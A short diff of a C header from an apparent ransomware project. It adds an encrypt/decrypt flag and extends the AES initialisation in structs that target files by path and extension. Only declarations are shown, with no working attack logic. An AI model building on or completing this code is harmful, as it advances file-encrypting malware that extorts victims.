@@ -36,7 +36,7 @@ typedef struct target_file_s
 	off_t file_offset;
 	size_t bytes_read;
 	struct stat file_info;
-	EVP_CIPHER_CTX *encrypt;
+	EVP_CIPHER_CTX *cipher;
 } target_file_t;
 void free_target_file_struct(target_file_t target_file);
 
@@ -54,6 +54,7 @@ typedef struct ransom_s
 	char *root_path;
 	char *file_exts_whole_str;
 	char **file_extensions;
+	char cipher_flag; /* 'e' for encrypt, 'd' for decrypt */
 	char *key;
 	unsigned int *salt; /** TEMP **/
 	target_file_t *target_file_buf;
@@ -85,7 +86,7 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 char *write_file(char *filepath, ransom_t *ransom);
 
 /* Openssl */
-int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx);
+int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx, EVP_CIPHER_CTX *d_ctx, ransom_t *ransom);
 unsigned char *aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len);
 unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len);
 
